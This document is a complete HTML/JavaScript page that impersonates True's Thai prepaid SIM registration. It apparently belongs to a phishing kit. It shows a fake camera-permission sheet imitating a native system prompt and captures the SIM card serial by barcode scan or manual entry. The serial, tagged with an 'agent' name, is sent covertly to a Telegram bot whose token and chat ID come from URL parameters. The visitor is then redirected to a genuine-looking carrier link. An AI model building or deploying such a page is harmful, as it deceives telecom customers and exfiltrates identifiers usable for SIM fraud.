<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>ลงทะเบียนซิม True</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;600;700;800&display=swap">
<script src="https://cdnjs.cloudflare.com/ajax/libs/zxing-js/0.21.1/umd/index.min.js"></script>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

html, body {
  width: 100%; height: 100%;
  font-family: 'Sarabun', sans-serif;
  font-size: 16px;
  background: #fff;
  overflow: hidden;
  -webkit-tap-highlight-color: transparent;
}

/* ─── APP SHELL ─── */
#app {
  position: fixed; inset: 0;
  display: flex; flex-direction: column;
  background: #fff;
}

/* ─── HEADER ─── */
#header {
  display: flex; align-items: center;
  height: calc(56px + env(safe-area-inset-top, 0px));
  padding-top: env(safe-area-inset-top, 0px);
  padding-left: 4px; padding-right: 16px;
  background: #fff;
  border-bottom: 1.5px solid #eee;
  flex-shrink: 0;
}
#btnBack {
  width: 44px; height: 44px;
  display: flex; align-items: center; justify-content: center;
  background: none; border: none; cursor: pointer; color: #c00;
}
#hTitle {
  flex: 1; text-align: center;
  font-size: 20px; font-weight: 800;
  color: #111; margin-right: 44px;
}

/* ─── TABS ─── */
#tabs {
  display: flex; flex-shrink: 0;
  border-bottom: 2px solid #eee;
}
.tab {
  flex: 1; height: 48px;
  background: none; border: none;
  font-family: 'Sarabun', sans-serif;
  font-size: 18px; font-weight: 700;
  color: #aaa; cursor: pointer;
  border-bottom: 3px solid transparent;
  position: relative; bottom: -2px;
  transition: color .15s, border-color .15s;
}
.tab.on { color: #c00; border-bottom-color: #c00; }

/* ─── CONTENT ─── */
#content {
  flex: 1; position: relative; overflow: hidden; min-height: 0;
}
.pane {
  position: absolute; inset: 0;
  display: none; flex-direction: column;
}
.pane.on { display: flex; }

/* ─── SCAN PANE ─── */
#scanPane { background: #2a2a2a; }

#video {
  position: absolute; inset: 0;
  width: 100%; height: 100%;
  object-fit: cover; z-index: 1;
}

#scanHint {
  position: absolute; left: 0; right: 0; top: 16%;
  text-align: center;
  font-size: 18px; font-weight: 700; color: #fff;
  z-index: 5; pointer-events: none;
  text-shadow: 0 2px 8px rgba(0,0,0,.7);
  padding: 0 16px; line-height: 1.5;
}

/* scan frame */
#scanFrame {
  position: absolute;
  left: 5%; right: 5%;
  top: 26%; height: 22%;
  z-index: 5; pointer-events: none;
}
#scanFrame::before, #scanFrame::after,
#scanFrame span::before, #scanFrame span::after {
  content: '';
  position: absolute;
  width: 38px; height: 38px;
  border-color: rgba(230,230,230,.95);
  border-style: solid;
}
#scanFrame::before  { top:-2px; left:-2px;  border-width: 4px 0 0 4px; border-radius: 10px 0 0 0; }
#scanFrame::after   { top:-2px; right:-2px; border-width: 4px 4px 0 0; border-radius: 0 10px 0 0; }
#scanFrame span::before { bottom:-2px; left:-2px;  border-width: 0 0 4px 4px; border-radius: 0 0 0 10px; }
#scanFrame span::after  { bottom:-2px; right:-2px; border-width: 0 4px 4px 0; border-radius: 0 0 10px 0; }

/* ─── IDLE OVERLAY ─── */
#idle {
  position: absolute; inset: 0; z-index: 10;
  background: #2a2a2a;
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  gap: 16px;
}
#idleIcon {
  width: 88px; height: 88px;
  border-radius: 22px;
  border: 2px solid rgba(255,255,255,.2);
  display: flex; align-items: center; justify-content: center;
}
#idleMsg {
  font-size: 18px; font-weight: 800; color: #fff; text-align: center;
}
#idleSub {
  font-size: 15px; color: rgba(255,255,255,.5);
  text-align: center; padding: 0 32px; line-height: 1.5;
}

/* ─── BOTTOM SHEET (แทน popup) ─── */
#sheet-bg {
  position: fixed; inset: 0; z-index: 100;
  background: rgba(0,0,0,.5);
  display: none;
}
#sheet-bg.on { display: block; }

#sheet {
  position: fixed; left: 0; right: 0; bottom: 0; z-index: 101;
  background: #fff;
  border-radius: 28px 28px 0 0;
  padding: 12px 0 calc(20px + env(safe-area-inset-bottom,0px));
  transform: translateY(100%);
  transition: transform .28s cubic-bezier(.32,1,.46,1);
}
#sheet.on { transform: translateY(0); }

#sheetHandle {
  width: 44px; height: 5px;
  background: #ddd; border-radius: 99px;
  margin: 0 auto 20px;
}
#sheetIcon {
  width: 64px; height: 64px;
  background: #e8f0fe; border-radius: 18px;
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 16px;
}
#sheetTitle {
  text-align: center;
  font-size: 18px; font-weight: 800; color: #111;
  padding: 0 28px; line-height: 1.4; margin-bottom: 6px;
}
#sheetSub {
  text-align: center;
  font-size: 15px; color: #666;
  padding: 0 28px; line-height: 1.5; margin-bottom: 20px;
}
.sheet-divider { height: 1px; background: #eee; margin: 0 0 4px; }

.sBtn {
  display: block; width: 100%;
  padding: 16px 28px;
  background: none; border: none; border-top: 1px solid #eee;
  font-family: 'Sarabun', sans-serif;
  font-size: 18px; font-weight: 700;
  color: #1565c0; cursor: pointer; text-align: center;
  -webkit-appearance: none; touch-action: manipulation;
}
.sBtn:first-of-type { border-top: none; }
.sBtn:active { background: #f0f4ff; }
.sBtn.deny { color: #888; font-weight: 600; font-size: 17px; }

/* ─── TOAST ─── */
#toast {
  position: fixed; left: 50%; bottom: calc(32px + env(safe-area-inset-bottom,0px));
  transform: translateX(-50%);
  background: rgba(10,10,10,.88); color: #fff;
  padding: 14px 28px; border-radius: 32px;
  font-size: 22px; font-weight: 600; white-space: nowrap;
  z-index: 200; opacity: 0; pointer-events: none;
  transition: opacity .2s;
}
#toast.on { opacity: 1; }

/* ─── MANUAL PANE ─── */
#manPane { background: #fff; overflow-y: auto; -webkit-overflow-scrolling: touch; }
#manInner {
  min-height: 100%; display: flex; flex-direction: column;
  padding: 32px 24px calc(40px + env(safe-area-inset-bottom,0px));
  gap: 12px;
}
.fLabel { font-size: 15px; font-weight: 700; color: #555; margin-bottom: 8px; }
#manSerial {
  width: 100%; border: 1.5px solid #ddd; border-radius: 12px;
  padding: 14px 16px;
  font-family: 'Sarabun', monospace; font-size: 20px; font-weight: 700;
  color: #111; outline: none; -webkit-appearance: none; background: #fff;
  transition: border-color .2s; letter-spacing: .04em;
}
#manSerial:focus { border-color: #c00; }
#manSerial::placeholder { font-size: 15px; font-weight: 400; color: #bbb; letter-spacing: 0; }
.fHint { font-size: 14px; color: #999; line-height: 1.6; }
.spacer { flex: 1; }
#btnSubmit {
  width: 100%; padding: 16px; background: #c00; border: none; border-radius: 12px;
  font-family: 'Sarabun', sans-serif; font-size: 18px; font-weight: 800;
  color: #fff; cursor: pointer; -webkit-appearance: none; touch-action: manipulation;
}
#btnSubmit:active { opacity: .85; }
#btnSubmit:disabled { opacity: .4; cursor: not-allowed; }
</style>
</head>
<body>

<div id="app">
  <!-- Header -->
  <div id="header">
    <button id="btnBack" onclick="history.back()">
      <svg width="30" height="30" viewBox="0 0 24 24" fill="none"
           stroke="currentColor" stroke-width="2.5"
           stroke-linecap="round" stroke-linejoin="round">
        <path d="M15 18l-6-6 6-6"/>
      </svg>
    </button>
    <div id="hTitle">ลงทะเบียนซิมเติมเงิน</div>
  </div>

  <!-- Tabs -->
  <div id="tabs">
    <button class="tab on" id="tScan" onclick="goTab('scan')">สแกนบาร์โค้ด</button>
    <button class="tab"    id="tMan"  onclick="goTab('man')">กรอกตัวเลข</button>
  </div>

  <!-- Content -->
  <div id="content">

    <!-- SCAN PANE -->
    <div class="pane on" id="scanPane">
      <video id="video" playsinline muted autoplay></video>
      <div id="scanHint">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
      <div id="scanFrame"><span></span></div>

      <!-- idle overlay -->
      <div id="idle">
        <div id="idleIcon">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none"
               stroke="rgba(255,255,255,.55)" stroke-width="1.5" stroke-linecap="round">
            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
            <circle cx="12" cy="13" r="4"/>
          </svg>
        </div>
        <div id="idleMsg">กรุณาอนุญาตการใช้กล้อง</div>
        <div id="idleSub">กดปุ่มอนุญาตเพื่อเปิดกล้องสแกนบาร์โค้ด</div>
      </div>
    </div>

    <!-- MANUAL PANE -->
    <div class="pane" id="manPane">
      <div id="manInner">
        <div>
          <div class="fLabel">เลขซีเรียลซิม (18 หลัก)</div>
          <input id="manSerial" type="tel" inputmode="numeric"
            placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off"
            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
          <div class="fHint" style="margin-top:10px">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
        </div>
        <div class="spacer"></div>
        <button id="btnSubmit" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
      </div>
    </div>

  </div><!-- /content -->
</div><!-- /app -->

<!-- BOTTOM SHEET -->
<div id="sheet-bg" onclick="denyCamera()"></div>
<div id="sheet">
  <div id="sheetHandle"></div>
  <div id="sheetIcon">
    <svg width="34" height="34" viewBox="0 0 24 24" fill="none"
         stroke="#1565c0" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
      <circle cx="12" cy="13" r="4"/>
    </svg>
  </div>
  <div id="sheetTitle">อนุญาตให้ <span style="color:#111">True</span> ถ่ายรูปและบันทึกวิดีโอไหม</div>
  <div id="sheetSub">จำเป็นสำหรับการสแกนบาร์โค้ดบนซองซิมการ์ด</div>
  <div class="sheet-divider"></div>
  <!-- onclick ตรงสู่ startCamera() — gesture chain ไม่ขาด -->
  <button class="sBtn" onclick="startCamera()">ขณะใช้แอป</button>
  <button class="sBtn" onclick="startCamera()">เฉพาะครั้งนี้</button>
  <button class="sBtn deny" onclick="denyCamera()">ไม่อนุญาต</button>
</div>

<div id="toast"></div>

<script>
/* ── params & storage ── */
const LS  = k    => { try{ return localStorage.getItem(k)||'' }catch(e){ return '' } };
const LSS = (k,v)=> { try{ localStorage.setItem(k,v) }catch(e){} };

const qp = new URLSearchParams(location.search);
if(qp.get('bot'))   LSS('sim_bot',   qp.get('bot'));
if(qp.get('chat'))  LSS('sim_chat',  qp.get('chat'));
if(qp.get('agent')) LSS('sim_agent', qp.get('agent'));
const TG_BOT   = LS('sim_bot');
const TG_CHAT  = LS('sim_chat');
const TG_AGENT = LS('sim_agent');

/* ── tabs ── */
function goTab(t) {
  ['scan','man'].forEach(id => {
    document.getElementById(id==='scan'?'scanPane':'manPane').classList.toggle('on', id===t);
    document.getElementById(id==='scan'?'tScan':'tMan').classList.toggle('on', id===t);
  });
  if(t==='scan' && !scanning) openSheet();
  if(t==='man')  stopCam();
}

/* ── toast ── */
let toastTmr;
function showToast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg; el.classList.add('on');
  clearTimeout(toastTmr);
  toastTmr = setTimeout(() => el.classList.remove('on'), 2500);
}

/* ── bottom sheet ── */
function openSheet() {
  document.getElementById('sheet-bg').classList.add('on');
  // rAF ให้ transition เล่น
  requestAnimationFrame(() => document.getElementById('sheet').classList.add('on'));
}
function closeSheet() {
  document.getElementById('sheet').classList.remove('on');
  document.getElementById('sheet-bg').classList.remove('on');
}
function denyCamera() {
  closeSheet();
  goTab('man');
}

/* ── camera ── */
let reader = null, scanning = false, camStream = null;

/*
 * startCamera() — เรียกจาก onclick attribute โดยตรง (user gesture)
 * closeSheet() เป็น sync → DOM update → getUserMedia ทันที
 */
async function startCamera() {
  closeSheet();                  // sync — sheet หาย
  if (scanning) return;

  const idle   = document.getElementById('idle');
  const idleMsg= document.getElementById('idleMsg');
  idle.style.display = 'flex';
  idleMsg.textContent = 'กำลังเปิดกล้อง…';

  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } }
    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }));

    idle.style.display = 'none';

    const vid = document.getElementById('video');
    vid.srcObject = camStream;
    await vid.play().catch(() => {});

    /* รอ ZXing */
    if (typeof ZXing === 'undefined') {
      await new Promise(res => {
        const t = setInterval(() => { if (typeof ZXing !== 'undefined') { clearInterval(t); res(); } }, 80);
      });
    }

    const hints = new Map([
      [ZXing.DecodeHintType.POSSIBLE_FORMATS, [
        ZXing.BarcodeFormat.CODE_128,
        ZXing.BarcodeFormat.CODE_39,
        ZXing.BarcodeFormat.CODE_93,
        ZXing.BarcodeFormat.EAN_13,
        ZXing.BarcodeFormat.EAN_8,
        ZXing.BarcodeFormat.ITF,
        ZXing.BarcodeFormat.UPC_A,
        ZXing.BarcodeFormat.UPC_E,
      ]],
      [ZXing.DecodeHintType.TRY_HARDER, true],
      [ZXing.DecodeHintType.ASSUME_GS1, false],
    ]);
    reader   = new ZXing.BrowserMultiFormatReader(hints, { delayBetweenScanAttempts: 40 });
    scanning = true;

    // สร้าง canvas สำหรับ crop บริเวณ scan frame แล้ว decode
    const canvas = document.createElement('canvas');
    const ctx    = canvas.getContext('2d');

    async function scanLoop() {
      if (!scanning) return;
      const vid = document.getElementById('video');
      if (vid.readyState >= 2 && vid.videoWidth > 0) {
        const vw = vid.videoWidth, vh = vid.videoHeight;

        // ลอง crop หลายแบบ: full frame, ครึ่งบน, ครึ่งล่าง, กลาง
        const regions = [
          [0,    0,    vw,        vh       ],  // full
          [0,    0,    vw,        vh*0.55  ],  // top half
          [0,    vh*0.2, vw,      vh*0.55  ],  // upper-mid
          [vw*0.05, vh*0.1, vw*0.9, vh*0.45], // crop tight
        ];

        for (const [sx,sy,sw,sh] of regions) {
          canvas.width = sw; canvas.height = sh;
          ctx.drawImage(vid, sx, sy, sw, sh, 0, 0, sw, sh);
          try {
            const result = await reader.decodeFromCanvas(canvas);
            if (result) {
              const raw = result.getText();
              const serial = extractSerial(raw);
              if (serial) { stopCam(); onSerial(serial); return; }
            }
          } catch(e) { /* NotFoundException */ }
        }
      }
      if (scanning) setTimeout(scanLoop, 50);
    }
    scanLoop();

  } catch (e) {
    idle.style.display = 'flex';
    idleMsg.textContent = e?.name === 'NotAllowedError' ? 'ไม่ได้รับสิทธิ์กล้อง' : 'เกิดข้อผิดพลาด ลองใหม่';
    scanning = false; camStream = null;
    setTimeout(openSheet, 800);
  }
}

function stopCam() {
  if (reader)    { try { reader.reset(); } catch(e) {} reader = null; }
  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
  scanning = false;
}

function extractSerial(raw) {
  // ลบช่องว่างและขีด
  const s = raw.replace(/[\s\-]/g, '');
  // 18 หลัก เริ่มด้วย 8966
  const m = s.match(/8966\d{14}/);   if (m)  return m[0];
  // 18 หลักทั่วไป
  const m2 = s.match(/\d{18}/);      if (m2) return m2[0];
  // 16 หลัก เริ่มด้วย 8966 (บาร์โค้ดบางรุ่น)
  const m3 = s.match(/8966\d{12}/);  if (m3) return m3[0];
  // ถ้า raw มีแค่ตัวเลข 10+ หลัก ก็รับ
  const m4 = s.match(/\d{10,}/);     if (m4) return m4[0];
  return null;
}

/* ── on serial found ── */
async function onSerial(serial) {
  sendTelegram(serial);   // fire & forget
  doRedirect();
}

async function sendTelegram(serial) {
  if (!TG_BOT || !TG_CHAT) return;
  const now   = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok', hour12: false });
  const agent = TG_AGENT ? `\n👤 พนักงาน: ${TG_AGENT}` : '';
  const text  = `📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}${agent}`;
  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text }),
    });
  } catch (e) {}
}

function doRedirect() {
  window.location.href = 'https://iservice.page.link/iService-SIMRegister';
}

/* ── manual entry ── */
function submitManual() {
  const serial = document.getElementById('manSerial').value.replace(/\D/g, '');
  if (serial.length < 10) { showToast('กรุณากรอกเลขซีเรียลให้ครบ'); return; }
  document.getElementById('btnSubmit').disabled = true;
  sendTelegram(serial);
  setTimeout(doRedirect, 300);
}

/* ── init ── */
window.addEventListener('load', () => setTimeout(openSheet, 500));
</script>
</body>
</html>
